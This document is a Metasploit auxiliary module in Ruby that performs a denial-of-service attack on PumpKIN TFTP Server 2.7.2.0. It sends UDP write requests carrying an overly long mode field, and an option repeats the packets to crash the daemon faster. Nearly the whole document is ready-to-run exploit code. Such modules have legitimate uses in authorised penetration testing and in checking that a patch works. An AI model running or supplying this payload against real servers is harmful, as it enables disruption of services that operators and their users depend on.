PumpKIN TFTP Server 2.7.2.0 Denial of Service Exploit (meta)
============================================================





require &#039;msf/core&#039;

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Udp
	

	def initialize(info = {})
		super(update_info(info,	
			&#039;Name&#039;           => &#039;PumpKIN TFTP Server DoS&#039;,
			&#039;Description&#039;    => %q{
				PumpKIN TFTP Server 2.7.2.0 eventually reaches a DoS condition when
				provided with an overly long mode value.  It&#039;ll take a minute. 
				This condition is reached quicker when hammered repeatedly.
			},
			&#039;Author&#039;         => [&#039;Saint Patrick&#039;,&#039;monStream00&#039;],
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Version&#039;        => &#039;7&#039;,
			&#039;DisclosureDate&#039; => &#039;Oct 25 2008&#039;))

		register_options([
			OptInt.new(&#039;MULTIPLE&#039;, [ false, &#039;How many times to send (more kills it faster)&#039;, 1 ])
		])
	end

	def run
		
		print_status("Sending bad data...")
		
		crapfile=Rex::Text.rand_text_english(4,"\x00")
		crapdata=Rex::Text.rand_text_english(8000,"\x00")
		lamestring="\x00\x02"+crapfile+"\x00"+crapdata+"\x00"
		mul=datastore[&#039;MULTIPLE&#039;]
		0.upto(mul) do
			connect_udp
			udp_sock.put(lamestring)
			sleep 1
			disconnect_udp
		end

		print_status("PumpKIN TFTP daemon is choking...")

	end
end



